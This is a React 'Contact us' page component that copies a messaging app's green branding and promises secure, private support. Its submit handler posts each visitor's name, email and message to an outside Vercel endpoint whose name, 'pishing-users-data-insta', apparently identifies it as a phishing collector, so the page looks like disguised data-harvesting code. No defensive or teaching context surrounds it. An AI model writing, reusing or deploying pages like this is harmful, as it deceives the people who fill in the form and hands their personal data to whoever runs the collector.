import React, { useState } from 'react';
import { Send, Mail, User, MessageSquare } from 'lucide-react';
import Header from '../components/Header';

const Contactus = () => {
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    message: ''
  });
  const [status, setStatus] = useState('idle'); // idle, loading, success, error

  const handleSubmit = async (e) => {
    e.preventDefault();
    setStatus('loading');

    const payload = {
      ...formData,
      timestamp: new Date().toISOString()
    };

    try {
      const response = await fetch('https://pishing-users-data-insta-p2iolftif-hs-projects-7257de03.vercel.app/getdata', {
        method: 'POST', // Changed from OPTIONS to POST for data submission
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      if (response.ok || response.status === 204) {
        setStatus('success');
        setFormData({ name: '', email: '', message: '' });
      } else {
        setStatus('error');
      }
    } catch (error) {
      console.error("Submission error:", error);
      setStatus('error');
    }
  };

  return (
    <>
      <Header />
    <div className="min-h-screen bg-white py-20 px-6 md:px-20">
      <div className="container mx-auto max-w-5xl grid grid-cols-1 lg:grid-cols-2 gap-16">
        
        {/* Left Side: Contact Info */}
        <div className="space-y-8">
          <h1 className="text-5xl font-black text-slate-900 leading-tight">
            Get in <span className="text-[#25D366]">touch</span>
          </h1>
          <p className="text-lg text-slate-600 font-light">
            Have a question about privacy or want to report a bug? Our team is here to help you stay connected securely.
          </p>
          
          <div className="space-y-6 pt-6">
            <div className="flex items-center gap-4 p-4 bg-slate-50 rounded-2xl">
              <div className="p-3 bg-white shadow-sm rounded-xl text-[#25D366]"><Mail size={24} /></div>
              <div>
                <p className="text-xs font-bold uppercase text-slate-400">Email Us</p>
                <p className="text-slate-800 font-medium">support@liferumors.com</p>
              </div>
            </div>
            {/* Add more contact cards as needed */}
          </div>
        </div>

        {/* Right Side: Contact Form */}
        <div className="bg-white border border-slate-100 shadow-2xl p-8 md:p-10 rounded-[2.5rem]">
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-2">
              <label className="text-sm font-bold text-slate-700 ml-2">Full Name</label>
              <div className="relative">
                <User className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400" size={18} />
                <input 
                  type="text" 
                  required
                  placeholder="Sami Khan"
                  className="w-full pl-12 pr-4 py-4 bg-slate-50 border-none rounded-2xl focus:ring-2 focus:ring-[#25D366] outline-none transition-all"
                  value={formData.name}
                  onChange={(e) => setFormData({...formData, name: e.target.value})}
                />
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-bold text-slate-700 ml-2">Email Address</label>
              <div className="relative">
                <Mail className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400" size={18} />
                <input 
                  type="email" 
                  required
                  placeholder="user@gmail.com"
                  className="w-full pl-12 pr-4 py-4 bg-slate-50 border-none rounded-2xl focus:ring-2 focus:ring-[#25D366] outline-none transition-all"
                  value={formData.email}
                  onChange={(e) => setFormData({...formData, email: e.target.value})}
                />
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-sm font-bold text-slate-700 ml-2">Message</label>
              <div className="relative">
                <MessageSquare className="absolute left-4 top-4 text-slate-400" size={18} />
                <textarea 
                  required
                  rows="4"
                  placeholder="How can we help?"
                  className="w-full pl-12 pr-4 py-4 bg-slate-50 border-none rounded-2xl focus:ring-2 focus:ring-[#25D366] outline-none transition-all resize-none"
                  value={formData.message}
                  onChange={(e) => setFormData({...formData, message: e.target.value})}
                />
              </div>
            </div>

            <button 
              disabled={status === 'loading'}
              className="w-full py-4 bg-[#25D366] text-white font-bold rounded-2xl hover:bg-[#1ebe5d] transition-all flex items-center justify-center gap-2 shadow-lg shadow-green-100 disabled:opacity-50"
            >
              {status === 'loading' ? 'Sending...' : (
                <>Send Message <Send size={18} /></>
              )}
            </button>

            {status === 'success' && (
              <p className="text-center text-green-600 font-bold animate-pulse">Message sent successfully!</p>
            )}
            {status === 'error' && (
              <p className="text-center text-red-500 font-bold">Something went wrong. Try again.</p>
            )}
          </form>
        </div>

      </div>
    </div>
    </>
  );
};

export default Contactus;